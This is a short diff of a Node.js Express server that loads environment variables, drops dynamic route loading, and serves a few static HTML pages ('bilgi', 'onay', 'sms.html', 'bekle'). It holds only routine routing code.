@@ -1,29 +1,30 @@
 const express = require('express');
 const axios = require('axios');
 const path = require('path');
+require('dotenv').config();
 const app = express();
 const port = process.env.PORT || 3000;
-const { readdirSync } = require("fs");
 
 app.use(express.json());
 app.use(express.static('public'));
-
-// Import routes from the routes directory
-readdirSync("./routes").map((file) => app.use("/", require("./routes/" + file)));
 
 // Define static file routes
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, '/public/index.html'));
 });
+
 app.get('/bilgi', (req, res) => {
   res.sendFile(path.join(__dirname, '/public/bilgi.html'));
 });
+
 app.get('/onay', (req, res) => {
   res.sendFile(path.join(__dirname, '/public/onay.html'));
 });
+
 app.get('/sms.html', (req, res) => {
   res.sendFile(path.join(__dirname, '/public/sms.html'));
 });
+
 app.get('/bekle', (req, res) => {
   res.sendFile(path.join(__dirname, '/public/bekle.html'));
 });
